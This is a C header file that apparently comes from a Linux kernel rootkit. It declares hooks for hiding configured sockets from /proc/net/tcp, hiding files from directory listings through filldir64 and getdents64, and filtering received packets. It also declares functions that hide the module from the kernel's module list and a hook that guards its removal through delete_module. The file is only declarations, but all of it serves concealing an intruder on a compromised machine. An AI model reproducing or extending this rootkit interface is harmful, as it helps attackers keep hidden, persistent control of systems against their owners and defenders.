#pragma once

#include <hook.h>

/// @brief Enable/disable hiding of configured sockets from `/proc/net/tcp*`
HOOK_EXTERN(hide, tcp_seq_next);

/// @brief Enable/disable hiding of configured files from `filldir64`
HOOK_EXTERN(hide, filldir64);

/// @brief Enable/disable hiding of configured files from the syscall `getdents64`
HOOK_X64_SYSCALL_EXTERN(hide, getdents64);

/// @brief Enable/disable hiding of RX packets by configured filters at `netif_receive_skb_list_internal`
HOOK_EXTERN(hide, netif_receive_skb_list);

/// @brief Enable hiding this module from the module list.
void hide_enable_thismodule(void);

/// @brief Disable hiding this module from the module list.
/// @attention This is called from within hooks which are used to set the module as
///     removable, and there is no reason to call this from module_exit.
void hide_disable_thismodule(void);

/// @brief Enable/disable hooking the delete_module syscall to allow rmmod'ing this module.
HOOK_X64_SYSCALL_EXTERN(hide, delete_module);
